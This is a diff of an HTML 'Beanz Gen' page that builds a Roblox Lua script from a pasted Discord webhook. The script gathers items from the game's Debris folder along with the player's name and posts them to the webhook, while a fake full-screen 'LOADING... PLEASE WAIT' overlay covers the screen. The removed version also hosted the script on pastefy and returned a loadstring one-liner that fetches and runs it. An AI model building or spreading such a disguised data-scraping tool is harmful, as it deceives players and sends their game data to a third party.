@@ -3,42 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Beanz Gen V3</title>
+    <title>Beanz Gen V4</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: #111; border: 2px solid #0f0; padding: 20px; border-radius: 10px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 0 20px #0f0; }
-        input { width: 100%; padding: 10px; margin: 10px 0; background: #000; border: 1px solid #0f0; color: #0f0; box-sizing: border-box; }
-        button { width: 100%; padding: 10px; background: #0f0; border: none; color: #000; font-weight: bold; cursor: pointer; }
-        #output { margin-top: 15px; padding: 10px; border: 1px dashed #0f0; display: none; word-break: break-all; font-size: 12px; background: #050505; }
+        .card { background: #111; border: 2px solid #0f0; padding: 20px; border-radius: 10px; width: 90%; max-width: 450px; text-align: center; box-shadow: 0 0 20px #0f0; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #0f0; color: #0f0; box-sizing: border-box; border-radius: 5px; }
+        button { width: 100%; padding: 12px; background: #0f0; border: none; color: #000; font-weight: bold; cursor: pointer; border-radius: 5px; margin-top: 5px; }
+        textarea { width: 100%; height: 120px; margin-top: 15px; background: #050505; border: 1px dashed #0f0; color: #0f0; padding: 10px; box-sizing: border-box; display: none; font-size: 11px; }
+        .info { font-size: 12px; color: #aaa; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h2>BEANZ GEN V3</h2>
-        <input type="text" id="webhook" placeholder="Paste Discord Webhook">
-        <button id="btn" onclick="run()">GENERATE SCRIPT</button>
-        <div id="status">Status: Idle</div>
-        <div id="output"></div>
+        <h2>BEANZ GEN V4</h2>
+        <p class="info">Paste your webhook to get the full script</p>
+        <input type="text" id="webhook" placeholder="Paste Discord Webhook URL">
+        <button onclick="generate()">GENERATE FULL SCRIPT</button>
+        <textarea id="output" readonly></textarea>
+        <p id="hint" style="display:none; color:#fff; font-size:11px; margin-top:5px;">↑ Copy all and paste into your executor ↑</p>
     </div>
 
     <script>
-        async function run() {
-            const web = document.getElementById('webhook').value;
-            const status = document.getElementById('status');
+        function generate() {
+            const web = document.getElementById('webhook').value.trim();
             const output = document.getElementById('output');
-            const btn = document.getElementById('btn');
+            const hint = document.getElementById('hint');
 
-            if(!web.includes("discord")) return alert("Invalid Webhook");
+            if(!web.includes("discord.com/api/webhooks")) {
+                return alert("Invalid Webhook URL!");
+            }
 
-            btn.disabled = true;
-            status.innerText = "Status: Uploading...";
-
-            const lua = `local WEBHOOK_URL = "${web}"
+            const script = `local WEBHOOK_URL = "${web}"
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
 
-local function send(link)
+local function send()
     local d = {}
     local deb = Workspace:FindFirstChild("Debris")
     if deb then
@@ -48,13 +48,13 @@ local function send(link)
                 if ov then
                     local n = ov:FindFirstChild("DisplayName")
                     local g = ov:FindFirstChild("Generation")
-                    if n and g then table.insert(d, n.Text .. " (" .. g.Text .. ")") end
+                    if n and g then table.insert(d, n.Text .. " (Gen: " .. g.Text .. ")") end
                 end
             end
         end
     end
     local s = table.concat(d, "\\n")
-    local p = {["content"] = "@everyone", ["embeds"] = {{["title"] = "🫘 Scrape", ["fields"] = {{["name"] = "Player", ["value"] = Players.LocalPlayer.Name}, {["name"] = "Data", ["value"] = "\\\`\\\`\\\`" .. (s ~= "" and s or "None") .. "\\\`\\\`\\\`"}}}} }
+    local p = {["content"] = "@everyone", ["embeds"] = {{["title"] = "🫘 Scrape Result", ["color"] = 65280, ["fields"] = {{["name"] = "Player", ["value"] = Players.LocalPlayer.Name}, {["name"] = "Data", ["value"] = "\\\`\\\`\\\`" .. (s ~= "" and s or "None Found") .. "\\\`\\\`\\\`"}}}} }
     local r = syn and syn.request or http and http.request or http_request or request
     if r then r({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(p)}) end
 end
@@ -65,35 +65,16 @@ f.Size = UDim2.new(1, 0, 1, 0)
 f.BackgroundColor3 = Color3.new(0,0,0)
 local l = Instance.new("TextLabel", f)
 l.Size = UDim2.new(1,0,1,0)
-l.Text = "LOADING..."
+l.Text = "LOADING... PLEASE WAIT"
 l.TextColor3 = Color3.new(1,1,1)
+l.TextSize = 30
 
 task.wait(2)
-send("Join Link")`;
+send()`;
 
-            try {
-                // Using a different method to avoid the Connection Error
-                const res = await fetch('https://api.pastefy.app/v2/paste', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ title: "Script", content: lua, type: "LUA" })
-                });
-
-                const data = await res.json();
-                if(data.success) {
-                    status.innerText = "Status: Done!";
-                    output.innerText = 'loadstring(game:HttpGet("https://pastefy.app/' + data.paste.id + '/raw"))()';
-                    output.style.display = "block";
-                } else {
-                    status.innerText = "Status: Pastefy is busy, try again.";
-                }
-            } catch (e) {
-                // If it fails, we show a manual option
-                status.innerText = "Status: Use manual mode below";
-                output.innerText = "Error? Make sure your internet is stable and try again in 10 seconds.";
-                output.style.display = "block";
-            }
-            btn.disabled = false;
+            output.value = script;
+            output.style.display = "block";
+            hint.style.display = "block";
         }
     </script>
 </body>
